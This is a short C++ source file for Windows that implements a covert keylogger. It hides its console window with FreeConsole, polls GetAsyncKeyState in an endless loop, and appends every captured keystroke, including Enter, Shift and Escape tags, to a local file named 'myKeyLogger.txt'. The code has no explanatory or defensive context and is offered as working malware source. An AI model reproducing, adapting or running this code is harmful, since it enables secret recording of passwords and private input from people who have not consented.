#include <iostream>
#include <Windows.h>

using namespace std;

void out(char *filename, int key);

int main()
{
	FreeConsole();
  for(;;)
		{
			for(int i = 8; i<=255;i++)
			{
				if(GetAsyncKeyState(i) == -32767)
					{
						out("myKeyLogger.txt",i);
					}
			}
		}

  return 0;
}

void out(char *filename, int key)
{

	if(key==VK_RETURN)
		cout<<endl;
	else if (key==VK_SHIFT)
		cout<<" {SHIFT} ";
	else if(key==VK_ESCAPE)
		cout<<" {ESCAPE} ";
	else
	{
	char x = static_cast<char>(key);
	cout<<x;
	}
		FILE *output;
		output=fopen(filename,"a+");
	if(key==VK_RETURN)
		fprintf(output,"%s"," {ENTER} ");
	else if (key==VK_SHIFT)
		fprintf(output,"%s"," {SHIFT} ");
	else if(key==VK_ESCAPE)
		fprintf(output,"%s"," {ESCAPE} ");
	else
	fprintf(output,"%s",&key);

	fclose(output);
}
